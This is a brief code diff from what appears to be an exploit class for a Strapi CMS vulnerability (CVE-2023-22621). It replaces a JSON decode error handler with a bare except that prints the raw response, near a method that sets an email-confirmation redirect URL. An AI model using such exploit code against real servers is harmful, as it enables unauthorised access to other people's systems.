@@ -21,7 +21,8 @@ class CVE_2023_22621(StrapiExploitInterface):
             token = r.json()['data']['token']
             self.info(f"Got token: {token}")
             return token 
-        except JSONDecodeError:
+        except :
+            print("DEBUG:", r.text)
             return None
     def enable_confirmation(self, token: str, redirect_url: str) -> bool:
         '''Enable email confirmation and set the redirect URL'''
